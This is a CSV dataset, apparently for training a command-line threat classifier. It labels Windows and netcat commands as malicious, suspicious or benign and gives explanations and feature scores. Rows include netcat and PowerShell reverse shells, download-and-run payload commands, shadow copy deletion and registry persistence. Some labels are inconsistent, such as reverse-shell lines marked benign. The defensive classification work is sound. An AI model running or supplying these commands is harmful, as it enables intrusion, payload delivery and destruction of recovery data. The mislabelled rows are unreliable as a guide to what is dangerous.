prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
"powershell $client = New-Object System.Net.Sockets.TCPClient(""10.10.10.10""","This PowerShell command creates a new TCP client object and connects to the specified IP address, potentially allowing an attacker to establish a remote connection to a command and control server.",powershell,System.Net.Sockets.TCPClient,none,none,10.10.10.10,New-Object,none,0.65,malicious
"powershell $client = New-Object System.Net.Sockets.TCPClient(""11.10.10.10""","This PowerShell command creates a new TCP client object and connects to the specified IP address, potentially allowing an attacker to establish a remote connection to a command and control server.",powershell,System.Net.Sockets.TCPClient,none,none,11.10.10.10,New-Object,none,0.65,malicious
"powershell $client = New-Object System.Net.Sockets.TCPClient(""merelelu.ana""","This command creates a new TCP client object and connects to the specified IP address and port, potentially allowing for remote communication and data exfiltration.",powershell,System.Net.Sockets.TCPClient,none,none,none,New-Object,none,0.55,suspicious
desktopimgdownldr /lockscreenurl:https://10.10.10.10.com:8080/file.ext /eventName:randomname,"This command can be used to download an image from a specified URL and set it as the lock screen background, potentially as part of a social engineering attack to trick the user into entering their credentials.",desktopimgdownldr,https://10.10.10.10.com:8080/file.ext,none,https://10.10.10.10.com:8080/file.ext,10.10.10.10.com:8080,/lockscreenurl,none,0.75,malicious
desktopimgdownldr /lockscreenurl:https://11.11.11.11.com:8080/file.ext /eventName:randomname,"This command can be used to download an image from a remote server and set it as the lock screen background, potentially as part of a social engineering attack to trick the user into entering their credentials.",desktopimgdownldr,https://11.11.11.11.com:8080/file.ext,none,https://11.11.11.11.com:8080/file.ext,11.11.11.11.com:8080,/lockscreenurl,none,0.75,malicious
desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.ext /eventName:randomname,"This command can be used to download an image from a specified URL and set it as the lock screen background, potentially as part of a social engineering attack to trick the user into entering their credentials.",desktopimgdownldr ,https://domain.com:8080/file.ext ,none,https://domain.com:8080/file.ext ,domain.com:8080,/lockscreenurl,none,0.65,malicious
WinHttp.WinHttpRequest.5.1;$h.open('POST',"This command can be used to send HTTP POST requests to a remote server, potentially allowing an attacker to exfiltrate data or execute commands on a compromised machine.",none,WinHttp.WinHttpRequest.5.1,none,none,none,"new-object,$h.open,POST",none,0.55,suspicious
powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('POST',"This command can be used to send HTTP POST requests to a remote server, potentially allowing an attacker to exfiltrate data or execute commands on a compromised machine.",powershell,WinHttp.WinHttpRequest.5.1,none,none,none,"new-object,$h.open,POST",none,0.55,suspicious
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.119.155/PowerUp.ps1""","This command downloads a PowerShell script from a remote server, which could be used to execute malicious code on the target machine.",powershell,System.Net.WebClient,none,http://192.168.119.155/PowerUp.ps1,192.168.119.155,"New-Object,DownloadFile",none,0.75,malicious
telnet hostname.domain.com 80,"Potential use: Port scanning and reconnaissance.

What it does: Attempts to establish a connection to the specified hostname on port 80 using the Telnet protocol.",none,none,none,none, hostname.domain.com:80,telnet,none,0.15,benign
telnet 10.10.10.10 80,"Potential use: Port scanning and reconnaissance.

What it does: Attempts to establish a connection to the specified IP address on port 80 using the Telnet protocol.",none,none,none,none,10.10.10.10:80,telnet,none,0.15,benign
telnet 11.11.11.11 80,"Potential use: Port scanning and reconnaissance.

What it does: Attempts to establish a connection to the specified IP address on port 80 using the Telnet protocol.",none,none,none,none,11.11.11.11:80,telnet,none,0.15,benign
nc -l -p 6790,"This command sets up a listener on port 6790, which could be used to receive incoming connections or data from a remote attacker.",nc,none,none,none,6790,"-l,-p",none,0.25,benign
nc.exe 192.168.100.113 4444 -e cmd.exe,"This command can be used to establish a reverse shell to a remote attacker-controlled machine, allowing the attacker to execute arbitrary commands on the compromised machine.",nc.exe,cmd.exe,none,none,192.168.100.113:4444,#NAME?,none,0.65,malicious
nc.exe 193.168.100.113 4444 -e cmd.exe,"This command can be used to establish a reverse shell to a remote attacker-controlled machine, allowing the attacker to execute arbitrary commands on the compromised machine.",nc.exe,cmd.exe,none,none,193.168.100.113:4444,#NAME?,none,0.65,malicious
nc.exe -lnvp 8080,"This command opens a listening port on the local machine, potentially allowing an attacker to establish a reverse shell or transfer files.",nc.exe,none,none,none,8080,#NAME?,none,0.25,benign
nc.exe 192.168.100.113 4444,This command can be used to establish a reverse shell to a remote attacker-controlled machine on port 4444.,nc.exe,none,none,none,192.168.100.113:4444,none,none,0.15,benign
nc.exe 193.168.100.113 4444,This command can be used to establish a reverse shell to a remote attacker-controlled machine on port 4444.,nc.exe,none,none,none,193.168.100.113:4444,none,none,0.15,benign
C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p,"This command launches a service host process that runs services in the background, and it could potentially be used to hide malicious activity or execute code as a system-level process.",svchost.exe,C:\Windows\System32\svchost.exe,none,C:\Windows\System32\svchost.exe,none,"-k,LocalSystemNetworkRestricted,-p",none,0.65,malicious
C:\Windows\System32\cmd.exe /c vssadmin delete shadows /all /quiet,"Potential use: Deleting Volume Shadow Copies to hinder forensic analysis.
What it does: Deletes all Volume Shadow Copies on the system silently.",cmd.exe,shadows,none,C:\Windows\System32\cmd.exe,none,"/c,delete,/all,/quiet",none,0.65,malicious
C:\Windows\System32\cmd.exe /c wmic shadowcopy delete,"Potential use: Deleting shadow copies to hinder recovery efforts.
What it does: Executes the Windows Management Instrumentation Command-line (WMIC) tool to delete all shadow copies on the system.",cmd.exe,shadowcopy,none,C:\Windows\System32\cmd.exe,none,"/c,delete",none,0.65,malicious
C:\Windows\System32\WScript.exe C:\Users\admin\enYXval36C\38oDr5.vbs,This command can be used to execute a VBScript file and potentially run malicious code on a Windows machine.,Wscript.exe,C:\Users\admin\enYXval36C\38oDr5.vbs,none,C:\Windows\System32\WScript.exe,none,none,none,0.55,suspicious
C:\Windows\System32\Rundll32.exe 8ivq.dll arzy949,This command is not a legitimate Windows command and appears to be malicious.,Rundll32.exe,8ivq.dll,none,C:\Windows\System32\Rundll32.exe,none,none,none,0.55,suspicious
C:\Windows\System32\cmd.exe /c ping 127.0.0.1 && reg add HKEY CURRENT USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v enYXval36C /t REG SZ /d C:\enYXval36CenYXval36C\enYXval36C.vbs /f,"This command can be used to create a persistent backdoor by adding a registry key that executes a VBScript file every time the user logs in, while also disguising the command as a harmless ping to avoid detection.",cmd.exe,C:\enYXval36CenYXval36C\enYXval36C.vbs,none,C:\Windows\System32\cmd.exe,127.0.0.1,"/c,ping,add,/v,/t,/d,/f",none,0.75,malicious
C:\Windows\System32\mshta.exe ransom.hta,"This command can be used to execute a ransomware attack by running a malicious HTA file through the Microsoft HTML Application Host, potentially encrypting files on the Windows machine.",mshta.exe,ransom.hta,none,C:\Windows\System32\mshta.exe,none,none,none,0.55,suspicious
C:\Windows\SysWOW64\Rundll32.exe {64F97CDC...FAB40CA\}.db #1 #1},This command can be used to execute a malicious DLL file and potentially execute arbitrary code on the system.,Rundll32.exe, {64F97CDC...FAB40CA\}.db,none,C:\Windows\SysWOW64\Rundll32.exe,none,none,none,0.55,suspicious
C:\Windows\System32\cmd.exe /c (ping localhost >> nul & del $path\grey3.exe >> nul),"This command can be used to hide the execution of a malicious file (grey3.exe) by deleting it after pinging the local host, making it difficult to detect.",cmd.exe,grey3.exe,none,C:\Windows\System32\cmd.exe,localhost,"/c,ping,del",none,0.75,malicious
Regsvr32 ..\Kro.fis2,Adversaries may use regsvr32.exe to execute malicious DLLs.,Regsvr32,Kro.fis2,none,..\Kro.fis2,none,none,Mitre Attack,0.6,malicious
"Rundll32 ..\Kiod.hod2,DllRegisterServer",Adversaries may use rundll32.exe to load malicious DLLs. ,Rundll32,Kiod.hod2,none,..\Kiod.hod2,none,DllRegisterServer,Mitre Attack,0.7,malicious
EQNEDT32.EXE -Embedding,Adversaries may exploit CVE-2017-11882 vulnerability in eqnedt32 for remote code execution in target system.,EQNEDT32.EXE,none,none,none,none,embedding,Mitre Attack,0.2,suspicious
Cmd.exe /c reg add HKCU\<Reg Key Path> /d 1q1a1z.bat /f,Adversaries may use cmd.exe along with /c or /k parameter to launch other Windows utilities for further attack.,Cmd.exe,d 1q1a1z.bat ,none,HKCU\<Reg Key Path>,none,"reg add, /f",Mitre Attack,0.7,malicious
"PowerShell -c (New-Object System.Net.WebClient).DownloadFile(‘http://w2a0zj.pw/wnxtp2.exe’, ‘.\morose.exe’); Start(‘.\morose.exe’)",Adversaries may use powershell.exe to download payloads or execute malicious PowerShell-based tools or scripts.,PowerShell,morose.exe,none,http://w2a0zj.pw/wnxtp2.exe,none,DownloadFile,Mitre Attack,0.6,malicious
“C:\Windows\system32\attrib.exe” +h C:\Users\admin\Pictures\*.* /s,Adversaries may use attrib.exe to hide files for defense evasion on the target system.,attrib.exe,none,none,none,none, /s,Mitre Attack,0.2,suspicious
Wmic process call create “rundll32.exe C:\ProgramData\lLjlxNACJC.dll CPGenRandom”,Adversaries may use wmic for execution or performing lateral movement in the target network.,"Wmic, rundll32.exe",C:\ProgramData\lLjlxNACJC.dll ,none,C:\ProgramData\lLjlxNACJC.dll ,none,process call create,Mitre Attack,0.7,malicious
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I,Adversaries may abuse schtasks.exe utility to initiate execution or repeat execution of malicious code .,schtasks,none,none,none,none,"/run, I",Mitre Attack,0.2,suspicious
Netsh add helper C:/Users/Public/settingsync.dll,Adversaries may use netsh to gain persistence by executing helper DLL.,netsh, C:/Users/Public/settingsync.dll,none,none,none, add helper,Mitre Attack,0.6,malicious
